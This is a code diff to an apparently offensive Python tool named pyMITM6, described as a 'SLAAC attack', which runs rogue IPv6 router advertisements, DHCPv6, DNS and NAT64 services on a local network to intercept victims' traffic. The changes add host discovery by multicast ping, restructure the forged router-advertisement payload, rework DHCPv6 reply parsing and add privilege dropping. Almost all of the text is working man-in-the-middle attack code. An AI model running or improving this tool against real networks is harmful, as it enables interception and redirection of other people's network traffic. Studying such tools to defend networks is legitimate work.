@@ -21,6 +21,7 @@ import curses
 import curses.wrapper
 import threading
 import os
+import pwd
 import subprocess
 import csv
 from fcntl import ioctl
@@ -78,8 +79,9 @@ class TUI(object):
         """
         Draw the footer
         """
-        self.scr.hline(self.max_y - 5, 1, '-', self.max_x - 2)
-        self.scr.addstr(self.max_y - 4, 2, "Press < r > to reload DNS file".ljust(40) + self.message)
+        self.scr.hline(self.max_y - 6, 1, '-', self.max_x - 2)
+        self.scr.addstr(self.max_y - 5, 2, "Press < d > to discover hosts".ljust(40) + self.message)
+        self.scr.addstr(self.max_y - 4, 2, "Press < r > to reload DNS file".ljust(40))
         self.scr.addstr(self.max_y - 3, 2, "Press < Space > to select")
         self.scr.addstr(self.max_y - 2, 2, "Press < q > to exit")
 
@@ -113,10 +115,14 @@ class TUI(object):
                     self.message = load_dns(dns_file)
                     self.draw_footer()
                 else:
-                    self.message = "Cannot reload file"
+                    self.message = "Cannot reload file (undefined)"
                     self.draw_footer()
             elif key == ord('q'):
                 break
+            elif key == ord('d'):
+                disc.send()
+                self.message = "Discovery sent"
+                self.draw_footer()
             elif key == ord(' '):
                 self.set_value()
             Event().wait(0.01)
@@ -259,7 +265,6 @@ def get_mac(ip):
         pass
 
 
-#create tun device
 def mktun():
     """
     Create the TUN DEVICE
@@ -269,9 +274,9 @@ def mktun():
     # FLAG TO SET IF PERSISTENT
     tunsetpersist = tunsetiff + 1
     # FLAG TO SET OWNER PERMISSION ON IF
-    #tunsetowner = tunsetiff + 2
+    tunsetowner = tunsetiff + 2
     # FLAG TO SET GROUP PERMISSION ON IF
-    #tunsetgroup = tunsetiff + 4
+    tunsetgroup = tunsetiff + 4
     # INTERFACE TYPE TUN
     iff_tun = 0x0001
     # NO PACKET INFORMATION
@@ -286,11 +291,22 @@ def mktun():
     # SET INTERFACE PERSISTENT
     ioctl(tun_device, tunsetpersist, 1)
     # SET OWNER
-    #ioctl(tun_device, tunsetowner, 1000)
+    ioctl(tun_device, tunsetowner, pwd.getpwnam(result.user).pw_uid)
     # SET GROUP
-    #ioctl(tun_device, tunsetgroup, 1000)
+    ioctl(tun_device, tunsetgroup, pwd.getpwnam(result.user).pw_gid)
 
     return tun_device
+
+
+def get_ip():
+    """
+    Returns a free ipv4 in the pool for tun device (each new ipv6)
+    @rtype : list
+    """
+    try:
+        return list(''.join([hex(int(h))[2:].zfill(2) for h in p_hosts.pop().split('.')]))
+    except:
+        return None
 
 
 class DHCPsrv(threading.Thread):
@@ -314,34 +330,23 @@ class DHCPsrv(threading.Thread):
             try:
                 data, addr = self.sock.recvfrom(4096)
                 host = addr[0].split('%')[0]
-                if host not in d_hosts and host.startswith('fe80'):
-                    d_hosts[host] = ''
-                    get_mac(host)
                 if d_hosts[host] == 'x':
                     data = data.encode("hex")
                     srcp = data[:4]
                     dstp = data[4:8]
                     msgtype = data[16:18]
-                    src = socket.inet_pton(socket.AF_INET6, ll_add).encode("hex")
+                    src = ll_add
                     host = socket.inet_pton(socket.AF_INET6, host).encode("hex")
                     if srcp == '0222' and dstp == '0223' and msgtype == '0b':
                         trid = data[18:24]
                         b = 24
-                        h = 28
-                        l = 0
-                        option = ''
+                        option = data[b:b+4]
                         while option != '0001':
-                            option = data[b:h]
-                            b += 4
-                            h += 4
-                            l = int(data[b:h], 16) * 2
-                            if l == 0:
-                                b += 4
-                                h += 4
-                            else:
-                                b += 4 + l
-                                h += 4 + l
-                        clid = data[b - l - 8:b]
+                            length = int(data[b+4:b+8],16)
+                            b += 8 + (length*2)
+                            option = data[b:b+4]
+                        length = int(data[b+4:b+8],16)
+                        clid = '0001' + data[b+4:b+8] + data[b+8:b+8+length*2]
                         sid = '0002000e00010001' + hex(int(self.dhcp_time()))[2:] + ll_int.replace(':', '')
                         rdns = '00170010' + rtr_dns6
                         resp = list(dstp + srcp + '0' * 8 + '07' + trid + clid + sid + rdns)
@@ -388,12 +393,12 @@ class RAsrv(threading.Thread):
             try:
                 data, addr = self.sock.recvfrom(1024)
                 host = addr[0].split('%')[0]
-                if host not in d_hosts and host.startswith('fe80'):
+                if host not in d_hosts and host.startswith('fe80') and socket.inet_pton(socket.AF_INET6, host).encode("hex") != ll_add:
                     d_hosts[host] = ''
                     get_mac(host)
                 data = data.encode("hex")[:2]
                 if data == '85':
-                    self.sock.sendto(ra_data.decode("hex"), (host, 0))
+                    self.sock.sendto(self.payload.decode("hex"), (host, 0))
             except:
                 continue
 
@@ -405,6 +410,12 @@ class RAtimersrv(threading.Thread):
 
     def __init__(self):
         threading.Thread.__init__(self)
+
+        # Router Advertisement Generation
+        self.rtr_life = 30
+        self.payload = '860000004040' + hex(self.rtr_life)[2:].zfill(4) + 16 * '0' + '0304'
+        self.payload += hex(int(rtr_prefix_len))[2:].zfill(2) + 'c0000151800000384000000000' + rtr_prefix
+        self.payload += '190300000000001e' + rtr_dns6 + '0101' + ll_int.replace(':', '')
         self.kill_received = False
         self.sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
         self.group = socket.inet_pton(socket.AF_INET6, "ff02::1")
@@ -416,10 +427,11 @@ class RAtimersrv(threading.Thread):
         self.sock.bind(get_ll_addr(phy_int, int_index, 0))
 
     def run(self):
-        while not self.kill_received:
+        while not self.kill_received :
             try:
-                self.sock.sendto(ra_data.decode("hex"), ("ff02::1", 0))
-                Event().wait(30)
+                Event().wait(self.rtr_life)
+                if 'x' in d_hosts.values():
+                        self.sock.sendto(self.payload.decode("hex"), ("ff02::1", 0))
             except:
                 continue
 
@@ -692,21 +704,33 @@ class NAT64(threading.Thread):
                 continue
 
 
-# get an empty entry in the pool for tun device (each new ipv6)
-def get_ip():
+class PINGdisc():
     """
-    Returns a free ipv4 in the pool for tun device (each new ipv6)
-    @rtype : list
+    Handle Router Advertisement (triggered)
     """
-    try:
-        return list(''.join([hex(int(h))[2:].zfill(2) for h in p_hosts.pop().split('.')]))
-    except:
-        return None
+
+    def __init__(self):
+        self.payload = '80'+'00'+'0000'+'0000'+'000100000000000000'
+        self.sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
+        self.group = socket.inet_pton(socket.AF_INET6, "ff02::1")
+        self.mreq = self.group + pack('@I', 0)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, self.mreq)
+        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, 0)
+        self.sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 0xff)
+        self.sock.bind(get_ll_addr(phy_int, int_index, 0))
+
+    def send(self):
+        try:
+            self.sock.sendto(self.payload.decode("hex"), ("ff02::1", 0))
+        except:
+            pass
 
 
 if __name__ == '__main__':
     parser = ArgumentParser(description='pyMITM6 - SLAAC attack')
     parser.add_argument('-c', action="store", dest="dns_file", type=str, help="DNS file (comma separated)")
+    parser.add_argument('-u', action="store", dest="user", type=str, help="Running User")
     parser.add_argument('-int', action="store", dest="phy_int", type=str, help="Physical Interface Name")
     parser.add_argument('-dns4', action="store", dest="dns_v4", type=str, help="IPv4 DNS Server")
     parser.add_argument('-dns6', action="store", dest="dns_v6", type=str, help="IPv6 DNS Proxy")
@@ -719,6 +743,9 @@ if __name__ == '__main__':
 
     tun_name = result.tun_name
     if result.action:
+        if not result.user:
+            print "User is required"
+            exit()
         mktun()
         print "TUN interface created successfully"
         exit()
@@ -741,10 +768,15 @@ if __name__ == '__main__':
         elif not result.ip_pool:
             print "NO IP pool specified !"
             exit()
+        elif not result.user:
+            print "User is required"
+            exit()
+
         if not result.dns_file:
             dns_file = None
         else:
             dns_file = result.dns_file
+
     ip_pool = result.ip_pool
     dns_v4 = result.dns_v4
     dns_v6 = result.dns_v6
@@ -752,42 +784,32 @@ if __name__ == '__main__':
     bad_prefix = result.bad_prefix.split('/')[0]
     phy_int = result.phy_int
 
-    # Dict of Detected targets
+    # Dict of Detected targets => d_hosts, m_hosts
+    # Dict of hosts using nat ipv6:ipv4 => n_hosts
+    # Dict for custom dns records  => dns_hosts
     d_hosts = {}
     m_hosts = {}
-
-    # list of free IPv4 (pool)
-    p_hosts = []
-
-    # Dict of hosts using nat ipv6:ipv4
     n_hosts = {}
-
-    # Dict for custom dns records
     dns_hosts = {}
 
-    # Table of threads
-    threads = []
+    # list of free IPv4 (pool) => p_hosts
+    p_hosts = []
 
-    # Several inits
+    # find interface index
     int_index = get_if_index(phy_int)
+
+    # find mac addr
     ll_int = get_mac_addr(phy_int)
-    ll_add = get_ll_addr(phy_int, int_index, 0)[0]
 
-    # Router lifetime
-    rtr_life = '30'
+    # find link-local addr
+    ll_add = socket.inet_pton(socket.AF_INET6, get_ll_addr(phy_int, int_index, 0)[0]).encode("hex")
 
-    # Several Inits
     # good prefix
     rtr_prefix = socket.inet_pton(socket.AF_INET6, good_prefix).encode("hex")
     # dns ipv6
     rtr_dns6 = socket.inet_pton(socket.AF_INET6, dns_v6).encode("hex")
     # bad prefix
     fake_prefix = socket.inet_pton(socket.AF_INET6, bad_prefix).encode("hex")
-
-    # Router Advertisement Generation
-    ra_data = '860000004040' + hex(int(rtr_life))[2:].zfill(4) + 16 * '0' + '0304'
-    ra_data += hex(int(rtr_prefix_len))[2:].zfill(2) + 'c0000151800000384000000000' + rtr_prefix
-    ra_data += '190300000000001e' + rtr_dns6 + '0101' + ll_int.replace(':', '')
 
     # Pool Initialization
     init_pool(ip_pool)
@@ -796,12 +818,23 @@ if __name__ == '__main__':
     if dns_file is not None:
         load_dns(dns_file)
 
-    # Append threads to a table
+    threads=[]
     threads.append(DNSsrv(dns_v6))
     threads.append(DHCPsrv())
+    threads.append(NAT64())
     threads.append(RAsrv())
     threads.append(RAtimersrv())
-    threads.append(NAT64())
+
+    # Sending initial RA to discover hosts
+    disc = PINGdisc()
+    disc.send()
+
+    # Drop privs
+    os.setgroups([])
+    gid=pwd.getpwnam(result.user).pw_gid
+    uid=pwd.getpwnam(result.user).pw_uid
+    os.setresgid(gid, gid, gid)
+    os.setresuid(uid, uid, uid)
 
     # Demonize and start thread one by one
     for thread in threads:
@@ -817,3 +850,5 @@ if __name__ == '__main__':
         print "Ctrl-c received! Sending kill to threads..."
         for t in threads:
             t.kill_received = True
+
+    exit()
